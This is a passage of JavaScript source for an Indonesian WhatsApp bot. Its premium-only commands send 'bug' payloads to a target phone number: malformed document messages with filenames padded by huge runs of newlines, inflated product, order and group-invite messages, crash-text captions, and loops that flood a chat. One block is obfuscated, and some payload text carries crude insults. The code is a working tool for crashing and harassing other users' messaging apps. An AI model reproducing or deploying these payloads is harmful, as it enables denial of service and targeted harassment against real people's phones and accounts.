function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','HW\x20MODS\x20WA\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/6281214281312','397419wzTxRp','6281214281312@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':haikal[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':ppnyauser,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':m});haikal['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
}
}
break


case '*': {
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
							"url": "https://mmg.whatsapp.net/d/f/AkPnn7Fio3cJJFA3FNnwEU1KEhQkdj21P570McSH37xU.enc",
							"mimetype": "audio/mpeg",
							"title": `${buttonkal}.mp3`,
							"fileSha256": "MC1xyFsfPUKh63OTSqDufxiYcYDJXXOISQHQlo9bJVE=",
							"fileLength": "703757703757",
							"pageCount": 0,
							"mediaKey": "/W2EFYW4ht8z/oQ2o16SYvbABhAjZaBwM24YNyBu/kY=",
							"fileName": `Created Hw Mods`,
							"fileEncSha256": "KKZ9Ja7zNRgTGqMChKyLdZQlrBnDUDEUEYjdYmz0lRo=",
							"directPath": "/v/t62.7119-24/27392534_210815088086272_675382005207683498_n.enc?ccb=11-4&oh=01_AdSFpFkTAQUsEMZ2WuFUoP7NyjZ4BN4YPA_NJjiqgBPL4w&oe=63F02C9C",
							"mediaKeyTimestamp": "1674102639",
							"caption": `${teks}`,
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'jadidocu': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'jadidarknes': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'jadivirtext1': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🔥 ${teks} ${iphone}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext2': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🔥 ${teks} ${iphone1}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtex3t': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone2}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext4': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone3}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext5': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone4}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext6': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone5}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext7': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone6}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext8': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonkal}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext9': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonvirus}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext10': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${ngazap(prefix)}`}, { quoted:m })
}
}
break
//=================================================//
case 'jadibuginvite': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME 🔥 ${teks} ${ngazap(prefix)}`,
"groupName": `MY NAME 🔥 ${teks} ${ngazap(prefix)}`,
"caption": `🔥 ${teks} ${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m })
haikal.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
}
break
//=================================================//
case 'jadibugpayment' : {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:m})
}
}
break
//=================================================//
//=================================================//
case 'jadibugsw': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
joau = fs.readFileSync('./baseikal/video/haikal.mp4')
haikal.sendMessage(m.chat, { video: joau, mimetype: 'video/mp4', caption: `🔥 ${teks} ${buttonkal}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadibugbutton':
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
const buttonssk = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonnnnmMessage = {
text: `🔥 ${teks} ${bugsw}`,
footerText: '🔥 ${teks} ',
buttons: buttonssk,
headerType: 1
}
haikal.sendMessage(m.chat, buttonnnnmMessage)
}
 break
//=================================================//
case 'sendbuglist': case 'sendbuglist2': case 'sendbuglist3': case 'sendbuglist4': case 'sendbuglist5':
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
touchmebre = [
{
title: `🌷 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚 WA 🌷 ${buttonvirus} ${buttonvirus}`,
rows: [
{title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
]
}
]
haikal.sendListMsg(Pe, `🌷 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚 WA 🌷`, haikal.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
break
//=================================================//
case 'sendtrol': case 'sendtrol3': case 'sendtrol4': case 'sendtrol5': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": " BY 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚",
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted:m})
haikal.relayMessage(Pe, order.message, { messageId: order.key.id })
}
break
//=================================================//
case 'senddocu': case 'senddocu3': case 'senddocu4': case 'senddocu5': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ☆DARKNESS⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
haikal.relayMessage(Pe, document.message, { messageId: document.key.id })
m.reply('sukses Bug target')
}
break
//=================================================//
case 'senddocu2': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `🔥 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
haikal.relayMessage(Pe, document.message, { messageId: document.key.id })
m.reply('sukses Bug target')
}
break
//=================================================//
case 'virtext1': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${iphone}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext2': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${iphone1}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext3': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${iphone2}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext4': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${iphone3}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext5': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${iphone4}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext6': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${iphone5}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext7': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: ppnyauser,  caption: `𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚${iphone6}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext8': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
